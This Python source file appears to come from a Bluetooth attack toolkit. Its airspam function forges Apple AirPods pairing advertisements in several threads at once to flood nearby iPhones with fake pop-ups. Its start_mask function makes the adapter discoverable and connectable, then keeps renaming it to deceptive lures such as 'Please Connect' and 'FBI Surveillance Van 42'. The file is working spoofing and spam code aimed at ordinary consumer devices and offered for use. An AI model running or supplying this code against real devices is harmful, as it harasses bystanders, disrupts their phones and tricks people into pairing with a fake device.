import os
import subprocess
import time
from random import choice
import random
import argparse
import threading
import bluetooth._bluetooth as bluez
from utils.bluetooth_utils import (toggle_device, start_le_advertising, stop_le_advertising)
try:
    from JammyTools.colors import cprint, iprint, wprint, cinput, RED, GREEN, WHITE, MAGENTA, BLUE, RESET, BRIGHT, CYAN, YELLOW, LIGHT_GREEN, BLACK, LIGHT_YELLOW, LIGHT_RED, LIGHT_BLUE, LIGHT_CYAN, LIGHT_MAGENTA, LIGHT_WHITE
except ModuleNotFoundError:
    from colors import cprint, iprint, wprint, cinput, RED, GREEN, WHITE, MAGENTA, BLUE, RESET, BRIGHT, CYAN, YELLOW, LIGHT_GREEN, BLACK, LIGHT_YELLOW, LIGHT_RED, LIGHT_BLUE, LIGHT_CYAN, LIGHT_MAGENTA, LIGHT_WHITE

def generate_random_data(base_data, data2):
    # Randomize speaker and case data, keeping base_data and data2 static
    left_speaker = (random.randint(1, 100),)
    right_speaker = (random.randint(1, 100),)
    case = (random.randint(128, 228),)
    randomized_data = base_data + left_speaker + right_speaker + case + data2
    return randomized_data

def advertise_airpods(dev_id, airpods_type, base_data, data2, interval, duration):
    try:
        socks = []
        for i in dev_id:
            sock = bluez.hci_open_dev(int(i.replace("hci", "")))
            socks.append(sock)
        end_time = time.time() + duration
        while time.time() < end_time:
            data = generate_random_data(base_data, data2)
            print(f"Start advertising {airpods_type} with data: {data}")
            for s in socks:
                start_le_advertising(s, adv_type=0x03, min_interval=interval, max_interval=interval, data=data)
            time.sleep(interval/1000)  # Sleep for the interval duration
    except Exception as e:
        print(f"Error advertising {airpods_type}: {e}")
    finally:
        for sock in socks:
            stop_le_advertising(sock)

def airspam(inf):
    parser = argparse.ArgumentParser(description='Hello')
    parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
    parser.add_argument('-t', '--threads', default=5, type=int, help='Number of threads')
    args = parser.parse_args()

    dev_id = inf
    for i in dev_id:
        interface = i.replace("hci", "")
        toggle_device(int(interface), True)

    data2 = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93, 0x3a)

    # AirPods advertisement base data for different types
    airpods_base_data = {
        "Airpods": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
        "Airpods Pro": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
        "Airpods Max": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
        "Airpods Gen 2": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
        "Airpods Gen 3": (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45),
        }
    
    # Limit the number of threads to the specified number
    selected_types = list(airpods_base_data.items())[:args.threads]

    # Create and start threads for each selected AirPods type
    threads = []
    duration = 60  # Duration for which each thread should run, in seconds

    for airpods_type, base_data in selected_types:
        thread = threading.Thread(target=advertise_airpods, args=(dev_id, airpods_type, base_data, data2, args.interval, duration))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
    
    for i in dev_id:
        interface = i.replace("hci", "")
        toggle_device(int(interface), False)

def advertise(inf):
    index = inf.replace('hci', '')
    process = subprocess.Popen(['sudo', 'btmgmt', '--index', index], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    commands = "\n".join([
        'le on',
        'connectable on',
        'discov on',
        'advertising on',
        'exit'  
    ])

    stdout, stderr = process.communicate(input=commands)

    if process.returncode == 0:
        pass
    else:
        print("Error executing commands:", stderr)

def start_mask(inf):
    for i in inf:
        advertise(i)
    kws = ["AAAAAAA", "12345", "xvideos.gov", "torhub.xyz", "'Samsung Galaxy J420'", "'PizzaHut Tablet'", "'McDonalds Bluetooth'", "iNeedWeed", "'McDonalds Kiosk'", "'Not The WiFi'", "'Macbook Pro'", "AirStrikeIfConnected", "'Hello Habibi'", "iShowTooth", "'Free WiFi:)'", "'Not Your Speaker'", "'JBL Trip 3'", "'Airpods Min'", "'Apple(dont)Care'", "'Airpods 5'", "'Apple Car Play'", "'Apple Aircraft Play'", "'Beats URDAD'", "'Beats NOOB'", "'Beans Pro'", "'Apple Desktop-w420'", "'Please Connect'"]
    kws.extend([
    "'GoogleGlasses G420'", 
    "'UberEats Delivery Drone'", 
    "'NASA Secret Base'", 
    "'FBI Surveillance Van 42'", 
    "'Area51 WiFi'", 
    "'DontTryThisAtHome'", 
    "'HackMeIfYouCan'", 
    "'Tesla Roadster Network'", 
    "'Skynet Global Defense'", 
    "'Zuckerbergs Listening Device'", 
    "'Elons Mars Link'", 
    "'The Krusty Krab'", 
    "'Spongebob's Pineapple WiFi'", 
    "'Winterfell Direwolves'", 
    "'Hogwarts Great Hall WiFi'", 
    "'Starbucks WiBrew'", 
    "'Lord of the Pings'", 
    "'Gandalfs Magic Network'", 
    "'Dumbledores Army'", 
    "'Batcave Secure Network'", 
    "'Iron Mans Workshop'", 
    "'Wakanda ForeverNet'", 
    "'JARVIS Home Network'", 
    "'Voldemorts Horcrux'", 
    "'Pizza Time'", 
    "'Connect for Pizza'", 
    "'404 Network Unavailable:)'"
])

    try:
        while True:
            for i in inf:
                i = i.replace("hci", "")
                name = choice(kws)
                os.system(f"sudo btmgmt --index {i} name {name}")
                iprint(f">> Name of hci{i} was changed to {name}")
                time.sleep(5)
    except KeyboardInterrupt:
        os.system(f"sudo btmgmt advertising off")
        print("\n\n")



